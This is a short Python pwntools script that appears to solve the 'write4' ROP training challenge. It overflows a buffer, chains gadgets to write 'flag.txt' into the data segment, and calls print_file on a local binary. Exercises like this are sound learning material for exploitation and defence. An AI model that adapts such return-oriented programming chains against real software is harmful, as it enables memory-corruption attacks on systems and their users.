from pwn import *

context.log_level='debug'

pop_rdi = 0x0000000000400693
mov_r14_r15 = 0x0000000000400628
pop_r14_r15 = 0x0000000000400690
print_file = 0x0000000000400510
data_segment = 0x00601028
ret_gadget = 0x00000000004004e6

payload = b'a'*40
payload += p64(ret_gadget)
payload += p64(pop_r14_r15)
payload += p64(data_segment)
payload += b'flag.txt'
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(data_segment)
payload += p64(print_file)

p = process("./write4")
p.sendline(payload)
p.interactive()